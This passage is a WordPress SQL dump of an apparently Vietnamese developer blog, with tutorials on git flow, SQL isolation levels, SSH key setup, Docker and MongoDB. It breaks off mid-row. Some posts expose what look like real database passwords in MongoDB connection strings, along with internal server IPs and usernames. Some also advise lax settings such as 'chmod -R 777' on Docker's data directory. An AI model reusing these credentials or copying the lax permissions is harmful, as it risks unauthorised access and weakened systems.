(2121, 1, '2022-05-09 03:13:44', '2022-05-09 03:13:44', 'Các phiên bản thường dùng của 1 sản phẩm\r\n1. Product * (phiên bản ổn định nhất)\r\n2. Hotfix\r\n3. Release * (phiên bản chưa ổn định)\r\n4. Staging (Đã test xong, chờ xuất bản)\r\n5. Test \r\n6. Base\r\n7. Feature', 'Git cơ bản - 4. Git flow', '', 'publish', 'open', 'open', '', 'git-co-ban-4-git-flow', '', '', '2022-08-12 06:27:47', '2022-08-12 06:27:47', '', 0, 'https://duycode.com/?p=2121', 0, 'post', '', 0),
(2123, 1, '2023-07-01 01:00:15', '2023-07-01 01:00:15', '<h2>A. Các loại Anomaly</h2>\r\n<h3>1. Dirty Reads</h3>\r\nTransaction 2 đọc dữ liệu chưa đươc commit ở transaction 1\r\n<table>\r\n<tbody>\r\n<tr>\r\n<td>1</td>\r\n<td>2</td>\r\n<td>DATA</td>\r\n</tr>\r\n<tr>\r\n<td>START TRANSACTION;</td>\r\n<td>&nbsp;</td>\r\n<td>id = 1, username = \'Alice\'</td>\r\n</tr>\r\n<tr>\r\n<td>UPDATE user SET username = \'Bob\' WHERE id = \'1\';</td>\r\n<td>START TRANSACTION;</td>\r\n<td>id = 1, username = \'Bob\'</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>SELECT username FROM user where id = \'1\';</td>\r\n<td>id = 1, username = \'Bob\'</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>COMMIT;</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n<tr>\r\n<td>ROLLBACK;</td>\r\n<td>&nbsp;</td>\r\n<td>id = 1, title = \'Alice\'</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n\r\n<h3>2. Nonrepeatable Reads</h3>\r\n- Transaction 2 đọc dữ liệu 2 lần ra 2 kết quả khác nhau\r\n<table>\r\n<tbody>\r\n<tr>\r\n<td>1</td>\r\n<td>2</td>\r\n<td>DATA</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>&nbsp;START TRANSACTION;</td>\r\n<td>id = 1, username = \'Alice\'</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;START TRANSACTION;</td>\r\n<td>SELECT username FROM user where id = \'1\';</td>\r\n<td>id = 1, username = \'Alice\'</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;UPDATE user SET username = \'Bob\' WHERE id = \'1\';</td>\r\n<td>&nbsp;</td>\r\n<td>id = 1, username = \'Bob\'</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;COMMIT;</td>\r\n<td>SELECT username FROM user where id = \'1\';</td>\r\n<td>id = 1, title = \'Bob\'</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>COMMIT;</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n\r\n<h3>3. Phantom Record: Bản ghi ma </h3>\r\n- Bản ghi \'Bob\' đã được thêm và làm cho kết quả đọc 2 lần sai lệch\r\n<table>\r\n<tbody>\r\n<tr>\r\n<td>1</td>\r\n<td>2</td>\r\n<td>DATA</td>\r\n</tr>\r\n<tr>\r\n<td>START TRANSACTION;</td>\r\n<td>&nbsp;START TRANSACTION;</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>SELECT username FROM user where group_id = \'1\';</td>\r\n<td>\'Alice\'</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;INSERT INTO user (id, group_id, username) VALUES (4,1,\'Bob\')</td>\r\n<td>&nbsp;</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>SELECT username FROM user where group_id = \'1\';</td>\r\n<td>\'Alice\',\'Bob\'</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;COMMIT;</td>\r\n<td>COMMIT;</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n\r\n<h2>B. Isolation level</h2>\r\n<table>\r\n<tbody>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>Read Uncommitted</td>\r\n<td>Read Committed</td>\r\n<td>Repeatable Read</td>\r\n<td>Serializable</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;UPDATE đợi transaction kh&aacute;c COMMIT UPDATE</td>\r\n<td>&nbsp;Y</td>\r\n<td>&nbsp;Y</td>\r\n<td>&nbsp;Y</td>\r\n<td>&nbsp;Y</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;SELECT đợi transaction kh&aacute;c COMMIT UPDATE</td>\r\n<td>&nbsp;N</td>\r\n<td>&nbsp;Y</td>\r\n<td>&nbsp;Y</td>\r\n<td>&nbsp;Y</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;LOCK khi SELECT (kh&ocirc;ng cho transaction kh&aacute;c update)</td>\r\n<td>&nbsp;N</td>\r\n<td>&nbsp;N</td>\r\n<td>&nbsp;Y&nbsp;</td>\r\n<td>&nbsp;Y</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;LOCK khi SELECT (kh&ocirc;ng cho transaction kh&aacute;c delete, insert)</td>\r\n<td>&nbsp;N</td>\r\n<td>&nbsp;N</td>\r\n<td>&nbsp;N</td>\r\n<td>&nbsp;Y</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>&nbsp;</td>\r\n<td>&nbsp;</td>\r\n<td>&nbsp;</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;Dirt Read</td>\r\n<td>&nbsp;Y</td>\r\n<td>&nbsp;N</td>\r\n<td>&nbsp;N</td>\r\n<td>&nbsp;N</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;Nonerepeatable Read</td>\r\n<td>&nbsp;Y</td>\r\n<td>&nbsp;Y</td>\r\n<td>&nbsp;N</td>\r\n<td>&nbsp;N</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;Fantom Read</td>\r\n<td>&nbsp;Y</td>\r\n<td>&nbsp;Y</td>\r\n<td>&nbsp;Y</td>\r\n<td>&nbsp;N</td>\r\n</tr>\r\n</tbody>\r\n</table>', 'SQL Transaction – 1. Tổng quan', '', 'publish', 'open', 'open', '', 'sql-transaction-1-tong-quan', '', '', '2023-07-24 09:43:58', '2023-07-24 09:43:58', '', 0, 'https://duycode.com/?p=2123', 0, 'post', '', 0),
(2126, 1, '2022-05-13 10:36:29', '2022-05-13 03:36:29', '<h2>1. Bật RDP (Remote Desktop Protocol) để thao tác bằng tay</h2>\r\n- Dùng SSH cài đặt như sau:\r\n<pre>\r\nsudo apt-get update\r\nsudo apt-get install -y xrdp\r\nsudo apt-get install -y xfce4\r\nsudo service xrdp restart\r\n</pre>\r\n\r\n- Sau đó tạo password\r\n<pre>\r\nsudo -s\r\npasswd\r\n// Gõ pass word\r\n</pre>\r\n\r\n- Kiểm tra bên tab VPC Network xem kết nối ok chưa', 'Google Cloud Platform - Cơ bản', '', 'publish', 'open', 'open', '', 'google-cloud-platform-co-ban', '', '', '2022-08-20 03:42:01', '2022-08-20 03:42:01', '', 0, 'https://duycode.com/?p=2126', 0, 'post', '', 0),
(2131, 1, '2022-05-01 01:00:05', '2022-04-30 18:00:05', '1. Mở file config bằng VIM\r\n<blockquote>\r\nsudo vi /etc/ssh/sshd_config\r\n</blockquote>\r\n\r\n2. Chỉnh sửa một số setting\r\n<pre>\r\nPort 22\r\n// cho phép kết nối: với mọi IP\r\nListenAddress 0.0.0.0\r\n\r\n// nhập Password để kết nối SSH: cho phép \r\n// nếu không cho phép thì chỉ còn phương pháp kết nối bằng cặp key\r\nPasswordAuthentication yes\r\n\r\n// Cho phép password rỗng: không\r\nPermitEmptyPasswords no\r\n\r\n// Số lần nhập mật khẩu: 6\r\nMaxAuthTries 6\r\n\r\n// Cho phép Tài khoản Root login: không\r\n// Các tùy chọn: prohibit-password (phải dùng key SSH); no; yes\r\nPermitRootLogin no\r\n\r\n// Thời gian chờ nhàn rỗi: 300 giây\r\n// Nếu trong 300 giây không có hoạt động sẽ bị disconnect\r\nClientAliveInterval 300\r\n\r\n// Cho phép xác thực bằng cặp key\r\nPubkeyAuthentication yes\r\n\r\n// Vị trí đặt file key\r\n// Như ở dưới nghĩa là với tài khoản duycode thì thư mục là: duycode/.ssh/authorized_keys\r\nAuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2\r\n</pre>\r\n\r\n\r\n3. Khởi động lại SSH daemon\r\n<pre>\r\nsudo systemctl restart sshd\r\n</pre>\r\n\r\n4. Thử trên 1 máy tính khác kết nối bằng SSH xem kết nối được chưa\r\n<pre>\r\n// port mặc định 22\r\nssh root@34.87.178.129\r\n// nếu đổi cổng port sang 2233\r\nssh root@34.87.178.129 -p 2233\r\n</pre>\r\n\r\n5. Lưu ý\r\n- Mỗi lần SSH vào 1 server, client sẽ lưu lại server đó (gọi là fingerprint)\r\n- Giả sử server đó cài lại hệ điều hành, vẫn dùng user và password cũ thì client kết nối vào sẽ lỗi\r\n- Lúc này cần xóa thông tin trong fingerprint mới kết nối lại được\r\n- Thông tin các fingerprint được lưu ở: known_hosts\r\n<blockquote>cat  ~/.ssh/known_hosts</blockquote>\r\n\r\n\r\n\r\n\r\n', 'SSH - 1. Config Server', '', 'publish', 'open', 'open', '', 'ssh-2-config-server', '', '', '2022-08-20 03:40:49', '2022-08-20 03:40:49', '', 0, 'https://duycode.com/?p=2131', 0, 'post', '', 0),
(2143, 1, '2022-09-15 01:00:17', '2022-09-15 01:00:17', '<h2>1. Images trong Docker</h2>\r\n<pre>\r\n$ sudo docker images\r\n$ sudo docker search ubuntu\r\n$ sudo docker pull ubuntu:18.04\r\n$ sudo docker pull redis:7.0.0\r\n$ sudo docker pull mysql:latest\r\n\r\n$ sudo docker image rm redis:7.0.0\r\n$ sudo docker image history mysql\r\n$ sudo docker inspect mysql:latest\r\n</pre>\r\n\r\n<h2>2. Container trong Docker</h2>\r\n<pre>\r\n$ sudo docker ps -a\r\n\r\n// Tạo container: docker run <thamso> <IMAGE> <command> <thamsolenh>\r\n// -t: terminal, -d: chạy nền, --rm: thoát sẽ remove\r\n$ sudo docker run -it ubuntu:18.04\r\n$ sudo docker run -it --name \"TestCentOS\" -h centos1 centos:latest\r\n\r\n// Tranh thủ kiểm tra luôn xem container ubuntu chạy thế nào\r\nroot@bcd0966b68e6:/# cat /etc/*release\r\nroot@bcd0966b68e6:/# exit\r\n\r\n$ sudo socker inspect bcd0966b68e6\r\n$ sudo docker stop bcd0966b68e6\r\n$ sudo docker start bcd0966b68e6\r\n\r\n$ sudo docker rm bcd0966b68e6\r\n$ sudo docker rm -f bcd0966b68e6\r\n\r\n// Vào lại terminal của container\r\n$ sudo docker attach bcd0966b68e6\r\n\r\n// Chạy 1 lệnh trong container\r\n$ sudo docker exec TestUbuntu ls\r\n\r\n// Khởi động bash trong ubuntu\r\n$ sudo docker exec -it TestUbuntu bash\r\n\r\n// Thoát vẫn giữ container chạy -> Dùng tổ hợp phím: Ctrl + P + Q\r\n// Kiểm tra container đã thay đổi những file gì so với từ khi sinh ra\r\n$ sudo docker diff TestUbuntu\r\n# A: tạo mới\r\n# C: thay đổi\r\n# D: xóa\r\n\r\n// Kiểm tra logs của container c-php\r\n// --tail 10: lấy 10 dòng cuối\r\n// -f: lấy liên tục\r\n$ sudo docker logs c-php\r\n$ sudo docker logs --tail 10 c-php\r\n$ sudo docker logs -f c-php\r\n\r\n// Giám sát tài nguyên của tất cả các container đang chạy\r\n// Hoặc giám sát các container: c-php, c-mysql\r\n$ sudo docker stats\r\n$ sudo docker stats c-php c-mysql\r\n</pre>\r\n\r\n<h2>3. Docker prune</h2>\r\n<pre>\r\n// Xóa tất cả image, container, network không sử dụng\r\n$ docker system prune\r\n$ docker system prune -a --volumes\r\n$ docker container prune\r\n$ docker image prune\r\n</pre>\r\n\r\n<h2>4. Docker system</h2>\r\n\r\n<h2>5. Note</h2>\r\n<pre>\r\n// Xóa tất cả image, container, network có tên chứa nginx (dùng grep search)\r\ndocker images | grep nginx | awk \'{print $3}\' | xargs docker rmi\r\ndocker ps -a | grep nginx | awk \'{print $1}\' | xargs docker rm -f\r\ndocker network ls | grep nginx | awk \'{print $1}\' | xargs docker network rm\r\n\r\n// Hoặc\r\nsudo docker rm $(sudo docker ps -a | grep nginx | awk \'{print $1}\')\r\n\r\n// Hoặc dùng filter: Xóa tất cả container có image là nginx:1.23 (-q: chỉ hiển thị container ID)\r\nsudo docker stop $(sudo docker ps -q --filter ancestor=nginx:1.23)\r\n\r\n</pre>', 'Docker - 1: Docker container', '', 'publish', 'open', 'open', '', 'docker-1-docker-container', '', '', '2022-10-12 08:30:03', '2022-10-12 08:30:03', '', 0, 'https://duycode.com/?p=2143', 0, 'post', '', 0),
(2148, 1, '2022-06-15 02:00:48', '2022-06-15 02:00:48', '<h2>1. Chia sẻ dữ liệu giữa máy host và container</h2>\r\n<pre>\r\n// Giả sử dữ liệu để ở thư mục Draf trong Ubuntu. Lấy path:\r\n$ pwd\r\n#home/duy.ngo/Draf\r\n\r\n// Kiểm tra các volume\r\n$ sudo docker volume ls\r\n\r\n// Tạo ổ đĩa D1, D2\r\n$ sudo docker volume create D1\r\n$ sudo docker volume create D2\r\n\r\n// Tạo ổ đĩa D3 ánh xạ vào thư mục Draf\r\n$ sudo docker volume create --opt device=/home/duy.ngo/Draf --opt type=none --opt o=bind D3\r\n\r\n// kiểm tra ổ đĩa D3\r\n$ sudo docker inspect D3\r\n#[\r\n#    {\r\n#        \"CreatedAt\": \"2022-05-16T17:52:48+07:00\",\r\n#        \"Driver\": \"local\",\r\n#        \"Labels\": {},\r\n#        \"Mountpoint\": \"/var/lib/docker/volumes/D3/_data\",\r\n#        \"Name\": \"D3\",\r\n#        \"Options\": {\r\n#            \"device\": \"/home/duy.ngo/Draf\",\r\n#            \"o\": \"bind\",\r\n#            \"type\": \"none\"\r\n#        },\r\n#        \"Scope\": \"local\"\r\n#    }\r\n#]\r\n\r\n// xóa ổ đĩa D1\r\n$ sudo docker volume rm D1\r\n\r\n// Kiểm tra lại các volume\r\n$ sudo docker volume ls\r\n\r\n// Tạo 1 container. Ánh xạ thư mục Draf vào thư mục /home/dulieu trong container\r\n$ sudo docker run -it --name FirstUbuntu -v /home/duy.ngo/Draf:/home/dulieu e03f35874101\r\n\r\n// Tạo container thứ 2 dùng chung Volums với container FirstUbuntu\r\n$ sudo docker run -it --name SecondUbuntu --volumes-from FirstUbuntu e03f35874101\r\n\r\n// Tạo container thứ 3 ánh xạ vào ổ đĩa D2\r\n$ sudo docker run -it --name ThreeUbuntu --mount source=D2,target=/home/dulieu e03f35874101\r\n\r\n// Tạo container thứ 4 dùng ở đĩa D3 (ổ D3 phải dùng -v mà ko dùng mount)\r\n$ sudo docker run -it --name FourUbuntu -v D3:/home/disk e03f35874101\r\n\r\n</pre>\r\n\r\n<h2>2. Kiểm tra volume</h2>\r\n<div style=\"background-color:red\">\r\n<pre>\r\n// xem thông tin docker\r\ndocker info\r\n\r\n// cd vào folder lib\r\ncd /\r\ncd var/lib/\r\nls -la\r\n\r\n// thêm quyền đọc cho tất cả user (7=111=Read+Write+Excute)\r\nsudo chmod -R 777 docker/\r\n</pre>\r\n</div>', 'Docker - 2: Volumes', '', 'publish', 'open', 'open', '', 'docker-2-volumes', '', '', '2022-10-31 04:40:23', '2022-10-31 04:40:23', '', 0, 'https://duycode.com/?p=2148', 0, 'post', '', 0),
(2153, 1, '2022-05-11 02:00:54', '2022-05-11 02:00:54', '<blockquote>\r\nGiả sử ta sẽ tạo 1 cặp key là: version_schat và version_schat.pub\r\n- Phía Client sẽ dùng private key: version_schat\r\n- Phía Server sẽ dùng publickey: version_schat.pub\r\n</blockquote>\r\n\r\n<h3>1. Tạo cặp SSH key mới</h3>\r\n<pre>\r\n// Trên windown không dùng CMD, hãy dùng Gitbash nhé\r\n// Xem danh sách key hiện có. \r\n$ ls -al ~/.ssh\r\n# id_rsa      --> private key\r\n# id_rsa.pub  --> public key\r\n\r\n// Tạo cặp key mới với mã hóa rsa\r\n$ ssh-keygen -t rsa -b 4096 -C \"email_cua_ban@example.com\" \r\n// ngắn gọn hơn\r\n$ ssh-keygen -t rsa\r\n\r\n// Lưu ý: rsa dần không được sử dụng nữa -> chuyển sang dùng ecdsa\r\nssh-keygen -t ecdsa -b 521 -C \"your_email@example.com\"\r\n\r\n// Điền nơi lưu key: /home/duy.ngo/.ssh/id_ecdsa\r\n# Enter file in which to save the key (/home/duy.ngo/.ssh/id_ecdsa): [Press enter]\r\n\r\n// Điền mật khẩu cho key\r\n# Enter passphrase (empty for no passphrase): [Type a passphrase]\r\n# Enter same passphrase again: [Type passphrase again]\r\n\r\n# Your identification has been saved in /home/duy.ngo/.ssh/id_ecdsa\r\n# Your public key has been saved in /home/duy.ngo/.ssh/id_ecdsa.pub\r\n# The key fingerprint is:\r\n# SHA256:uOQVsO0QRG5jC/Lw0UReEfxAxiSIYf4Y4IkxO0ppBWc your_email@example.com\r\n\r\n// Xem lại danh sách key\r\n$ ls -al ~/.ssh\r\n# id_rsa\r\n# id_rsa.pub\r\n# id_ecdsa       --> private key vừa tạo\r\n# id_ecdsa.pub   --> public key vừa tạo\r\n</pre>\r\n\r\n<h3>2. Thêm key vào ssh-agent</h3>\r\n<pre>\r\n// Kiểm tra ssh-agent xem đã được kích hoạt chưa. Nếu trên window ko nhận lệnh eval thì chạy bằng Gitbash\r\n$ eval \"$(ssh-agent -s)\"\r\n# Agent pid 59566\r\n// Nếu chưa kích hoạt ssh-agent. Trên window, dùng PowerShell với Administrator\r\nGet-Service -Name ssh-agent | Set-Service -StartupType Manual\r\n\r\n// Thêm key \"version_schat\" vào ssh\r\n$ ssh-add ~/.ssh/id_ecdsa\r\n// Điền password của key id_ecdsa\r\n# Enter passphrase for /home/duy.ngo/.ssh/id_ecdsa: \r\n\r\n# Identity added: /home/duy.ngo/.ssh/id_ecdsa(your_email@example.com)\r\n</pre>\r\n\r\n<h3>3. Kết nối</h3>\r\n<pre>\r\n// Lấy nội dung public key\r\n$ cat ~/.ssh/id_ecdsa.pub\r\n# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKuMvHV/urlcaC6hnCy++9AKVJkNAKWc+sPZ1/QMTeeSRkj8uXiVoxtua3TKsdA3ETYiKLnN7/Krdz14XI5tb7yTgOHBmSPpo/lOYcEn+sD8E1fsNdOy11Hi9OsRWUaSOHf+1ROG5gtgIN0rXiFbuCpxNYdiCCsClNpvBrn0A11hfp7za08mLB9C/xUl1a0oyLFyDd95S50rMI28hyeWFtNBhcIPItNf/fBDfKqIwetgl5xrVASxRIOkWaiMximeRK7SUtcRnFhcaVuqLR/QWxviMirXF0w9rz4ULX2UYXF7eGxnm4xokaHoNwEULOP6megiHXuqmRewzVoslnn4QntNJfijPcyv2n3wqL4nXg6ZYVKiPx73GC/2YRA7mC0oVPJKavPANshCPkafoVzCFz95wVEQ8AvehiixWo3FqZ3ehsXeooPJ07lHb5XW09xBEzBxs/UB33N9ETxPpeg1JpkKUlVN1j1U7+UqWp8q6fJJECB8rhqN/zkg2W8cIaX6M= your_email@example.com\r\n\r\n// Nội dung private key\r\n$ cat ~/.ssh/id_ecdsa\r\n</pre>\r\n\r\n3.1. Với github\r\n<pre>\r\n// Thêm publickey: Vào trang chủ -> Settings/SSH --> New SSH Key --> điền Public key vào --> là xong\r\n// Kiểm tra đã kết nối được tới github chưa\r\nssh -T git@github.com\r\n// kết quả\r\nThe authenticity of host gitlab.com (207.97.227.239) can\'t be established.\r\n# RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.\r\n# Are you sure you want to continue connecting (yes/no)?\r\n\r\n// Gõ \"yes\"\r\n# Hi duyk30b! You\'ve successfully authenticated, but GitHub does not provide shell access.\r\n// Lưu ý với github: với key đã bị xóa thì không được phép dùng lại, buộc phải tại cặp key mới\r\n</pre>\r\n\r\n3.2. Với server khác\r\n<pre>\r\n// Tại Server: thêm public key\r\n// Tại Client kết nối thử\r\nssh -i /home/duy.ngo/.ssh/id_ecdsa schatadmin@13.76.181.183\r\n</pre>\r\n\r\n\r\n<h3>4. Một vài lưu ý</h3>\r\n1. Xóa cặp key\r\n<pre>\r\n// Kiểm tra các public key đang tồn tại trong ssh-add\r\n$ ssh-add -L\r\n// Kiểm tra các finger đang tồn tại trong ssh-add\r\n$ ssh-add -l\r\n</pre>\r\nB1: Xóa thủ công trong folder /.ssh\r\nB2: Xóa trong ssh-add\r\n<blockquote>\r\nssh-add -D\r\n</blockquote>\r\n\r\n2. Nếu có cả cặp public-key và private-key --> để trong thư mục gốc /.ssh --> khi ssh sẽ tự động tìm key kết nối được --> ảo chưa\r\n3. Nếu chỉ có mỗi private-key --> đương nhiên cần phải có tham số \"-i\" trong lệnh ssh\r\n', 'SSH – 3. Create public-key and private-key', '', 'publish', 'open', 'open', '', 'ssh-3-create-public-key-and-private-key', '', '', '2023-05-31 07:55:46', '2023-05-31 07:55:46', '', 0, 'https://duycode.com/?p=2153', 0, 'post', '', 0),
(2162, 1, '2022-05-02 03:00:45', '2022-05-01 20:00:45', 'Mô hình các Server trông như sau\r\n\r\n1. Tại Local\r\n<blockquote>\r\n// SSH vào ServerSSH bằng private key: version_schat \r\n$ cd ~/.ssh\r\n$ sudo ssh -i version_schat schatadmin@13.76.181.183\r\n// hoặc\r\nssh -i /home/duy.ngo/.ssh/version_schat schatadmin@13.76.181.183\r\n# [schatadmin@Schat-SSH-to-SGH ~]$\r\n</blockquote>\r\n\r\n2. Tại ServerSSH\r\n<pre>\r\n// SSH vào Server Deploy\r\n[schatadmin@Schat-SSH-to-SGH ~]$ bash ssh/live/deploy1.sh\r\n#[schatadmin@sg-scdeploy01 ~]$\r\n</pre>\r\n\r\n3. Tại Server Deploy\r\n<pre>\r\n// SSH vào server QA\r\n[schatadmin@sg-scdeploy01 ~]$ bash ssh/qa/qa3.sh \r\n[qaschatadmin@qa-schat03 ~]$\r\n</pre>\r\n\r\n4. Tại Server QA\r\n<pre>\r\n// Dùng mongo nào\r\n[qaschatadmin@qa-schat03 ~]$ mongo \'mongodb://appqa2schat:tahcs2aqppa@10.240.12.102:27017/schat?replicaSet=QA-schat-02\'\r\n# MongoDB shell version v4.0.20\r\n# MongoDB server version: 4.2.17-17\r\nQA-schat-02:PRIMARY>\r\n\r\n// Bắt đầu query\r\nQA-schat-02:PRIMARY> db.getCollection(\'rocketchat_settings\').find({_id:\'Accounts_SearchFields\'})\r\n\r\n// Query vui vui\r\ndb.getCollection(\'rocketchat_organization\').find({user: {$elemMatch: {username: \"wyungjung\"}}},{\"user.$\": 1})\r\n</pre>\r\n', 'NTQ - Demo Project', '', 'publish', 'open', 'open', '', 'ntq-demo-project', '', '', '2022-08-20 03:43:15', '2022-08-20 03:43:15', '', 0, 'https://duycode.com/?p=2162', 0, 'post', '', 0),
(2170, 1, '2022-05-02 02:00:16', '2022-05-01 19:00:16', '<blockquote>\r\nGiả sử ta đã có 1 cặp key là: version_schat và version_schat.pub\r\n- Phía Client sẽ dùng private key: version_schat\r\n- Phía Server sẽ dùng publickey: version_schat.pub\r\n</blockquote>\r\n\r\n<h2>1. Config server</h2>\r\n1.1. Cấu hình sshd\r\nVới Ubnuntu: /etc/ssh/sshd_config \r\nVới Windows C:\\ProgramData\\sshd_config \r\n\r\nBật xác thực bằng Key lên\r\n<blockquote>\r\nPubkeyAuthentication yes\r\nAuthorizedKeysFile .ssh/authorized_keys\r\n</blockquote>\r\n\r\n1.2. Thêm public key\r\n<pre>\r\n$ nano ~/.ssh/authorized_keys\r\n// Chỉ cần thêm public key vào file này là được\r\n</pre>\r\n\r\n\r\n<h2>2. Client thử connect bằng private key</h2>\r\n2.1. Connect đơn giản\r\n<pre>\r\n$ cd ~/.ssh \r\n// -i: điền path lưu key\r\n$ sudo ssh -i version_schat schatadmin@13.76.181.183\r\n</pre>\r\n\r\n2.2. Config Client\r\nĐể connect đơn giản cho những lần sau, có thể dùng file config schat\r\n- Tạo file config\r\n<pre>\r\n// Show các file hiện có trong .ssh\r\n$ ls ~/.ssh\r\n# id_rsa\r\n# id_rsa.pub\r\n# known_hosts\r\n# version_schat\r\n# version_schat.pub\r\n\r\n// Nếu chưa có file config thì cần phải tạo\r\n$ touch ~/.ssh/config\r\n\r\n// File này chỉ có thể đọc được và có thể ghi bởi người dùng và không thể truy cập được bởi người khác:\r\nchmod 600 ~/.ssh/config\r\n\r\n// Show lại kiểm tra xem đã có file config chưa\r\n$ ls ~/.ssh\r\n</pre>\r\n\r\n- Sửa file config\r\n<pre>\r\nHost schat\r\n	HostName 13.76.181.183\r\n	User schatadmin\r\n	Port 22\r\n	PreferredAuthentications publickey\r\n	IdentityFile \"/home/duy.ngo/.ssh/version_schat\"\r\n\r\n</pre>\r\n\r\n- Thử kết nối\r\n<pre>\r\n// Trước đây, khi connect thì cần như sau\r\n$ cd ~/.ssh \r\n$ sudo ssh -i version_schat schatadmin@13.76.181.183\r\n\r\n// Sau khi config\r\n$ ssh schat\r\n</pre>', 'SSH - Connect by Key: 2. Setting Server and Client', '', 'publish', 'open', 'open', '', 'ssh-connect-by-key-2-setting-server-and-client', '', '', '2022-09-06 07:50:58', '2022-09-06 07:50:58', '', 0, 'https://duycode.com/?p=2170', 0, 'post', '', 0),
(2186, 1, '2022-06-15 03:00:31', '2022-06-15 03:00:31', '<h2>1. Docker Network</h2>\r\n<pre>\r\n$ sudo docker network ls\r\n$ sudo docker network create --driver bridge mynetwork\r\n$ sudo docker network create --driver bridge network1\r\n$ sudo docker network rm network1\r\n$ sudo docker network inspect mynetwork \r\n// Thêm 1 container mycontainer vào network có tên mynetwork \r\ndocker network connect mynetwork mycontainer\r\n</pre>\r\n\r\n<h2>2. Kết nối giữa các Container</h2>\r\n<pre>\r\n// busybox là 1 images chứa nhiều lệnh liên quan đến mạng (như ping, http)\r\n$ docker pull busybox\r\n$ docker run -it --rm busybox\r\n// kiểm tra các lệnh có trong busybox\r\nls -la /bin/\r\nping google.com.vn\r\n\r\n// B1 mặc định (không có ánh xạ cổng, và sử dụng network mặc định là bridge)\r\n$ docker run -it --name B1 busybox\r\n\r\n// B2 ánh xạ từ localhost:8888 đến cổng 80\r\n$ docker run -it --name B2 -p 8888:80 busybox\r\n\r\n// B3 sử dụng network là: mynetwork\r\n$ docker run -it --name B3 --network mynetwork busybox\r\n\r\n// B4 sử dụng network là mynetwork, ánh xạ từ localhost:9999 đến cổng 80\r\n$ docker run -it --name B4 busybox\r\n\r\n// Lưu ý 1: Ctrl + P + Q để thoát terminal của container mà ko exit container đó\r\n// Lưu ý 2: B1 và B2 dùng chung mạng bridge nên kết nối được với nhau, nhưng không cùng mạng với B3, B4 nên không kết nối được\r\n\r\n\r\n// Xem chi tiết 1 container\r\n$ docker inspect B1\r\n\r\n// Tại B2 thử tạo 1 http (B4 làm tương tự)\r\ndocker attach B2\r\ncd var/www\r\n// Tạo máy chủ http làm việc trên thư mục này và sử dụng cổng PORT 80\r\nhttpd\r\n// Tạo 1 file html trong thư mục này\r\nvi index.html\r\n// Sửa nội dung file thành: \"Server is running\"\r\n\r\n// Tại B1 sử dụng ping đến google hoặc B2\r\ndocker attach B1\r\nping google.com      --> ok\r\nping 172.17.0.3      --> ping đến B2 --> ok\r\nping 172.20.0.2      --> ping đến B3 --> ok (do B3 đã được connect tới bridge)\r\nping 172.20.0.3      --> ping đến B4 --> failed\r\n\r\n// Khi cùng network, có thể dùng tên container để ping\r\nping B2\r\nping B3\r\n\r\n// Thử http get đến B2\r\nwget -O - 172.17.0.3\r\nwget -O - B2\r\n# Server is running\r\n\r\n// Tại trình duyệt máy host truy cập: http://127.0.0.1:8888\r\n# Server is running\r\n</pre>', 'Docker - 3: Networking', '', 'publish', 'open', 'open', '', 'docker-3-networking', '', '', '2022-08-09 10:08:33', '2022-08-09 10:08:33', '', 0, 'https://duycode.com/?p=2186', 0, 'post', '', 0),
(2234, 1, '2022-05-23 10:43:27', '2022-05-23 03:43:27', '<h2>1 số câu lệnh hay dùng </h2>\r\n<pre>\r\n// Connect db\r\nmongo localhost:3001\r\nmongo mongodb://root:example@localhost:27017/?authSource=admin\r\nmongo mongodb://schat:schat12345@10.240.13.38:27017/schat?authSource=schat\r\n\r\n// show database\r\nshow dbs\r\n\r\n// connect database: mydata\r\nuse mydata\r\n\r\n// Show all collections\r\nshow collections\r\n\r\n// Basic find\r\ndb.books.find()\r\n\r\n// Find document in collection: rocketchat_settings\r\ndb.getCollection(\'rocketchat_settings\').findOne({_id: \"User\'s Vacation Status\"})\r\n\r\n// Destroy\r\ndb.getCollection(\'rocketchat_settings\').remove({_id: \"User\'s Vacation Status\"})\r\n\r\n// Remove field tabId\r\ndb.getCollection(\"rocketchat_custom_emoji\").update(\r\n    { tabId: { $exists: true } },\r\n    { $unset: { tabId: 1 } },\r\n    { multi: true },\r\n);\r\n\r\n// Find _id but no know Collection\r\ndb.getCollectionNames().forEach(function(collName) {\r\n    var doc = db.getCollection(collName).findOne({\"_id\" : \"FfEG6ycEqCP8Lxbmm\"});\r\n    if(doc != null) print(doc._id + \" was found in \" + collName); \r\n}); \r\n\r\n// Change one field string -> int, use aggregate []\r\ndb.getCollection(\'rocketchat_settings\').updateOne({_id:\"LDAP_Port\"},[\r\n    { $set: \r\n        { \r\n            value: { $toInt: \"$value\" },\r\n            status: \'$otherField\'             \r\n        } \r\n    }\r\n])\r\n\r\ndb.getCollection(\'rocketchat_custom_emoji\').aggregate([\r\n    { $sort: { _updatedAt: -1 } },\r\n    { $group: { _id: 